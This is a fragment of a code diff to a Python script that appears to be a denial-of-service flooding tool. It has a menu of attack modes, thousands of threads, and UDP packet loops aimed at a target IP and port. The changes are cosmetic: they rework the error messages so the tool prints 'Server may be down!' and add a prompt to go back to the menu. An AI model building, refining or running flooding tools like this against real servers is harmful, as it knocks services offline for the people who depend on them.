@@ -158,11 +158,7 @@ while True:
                     else:
                         s.send(packet)
                 except:
-                    try:
-                        s.send(packet)
-                    except:
-                        pass
-                    pass
+                    print("[+] Server may be down!")
         threads = []
         for i in range(5000):
             try:
@@ -222,7 +218,7 @@ while True:
                         s.sendto(bytes(packet), (ip, port))
                         sent += 1
                     except:
-                        print("[+] There was an error.")
+                        print("[+] Server may be down!")
             while True:
                 try:
                     x = threading.Thread(target=flood)
@@ -231,6 +227,7 @@ while True:
                     pass
         except:
             print("[+] Permission Error: Make sure to run this script as administrator.")
+            input("[+] Press Enter to go back.")
     elif attacker.lower() == "requester":
         os.system('cls')
         print("")
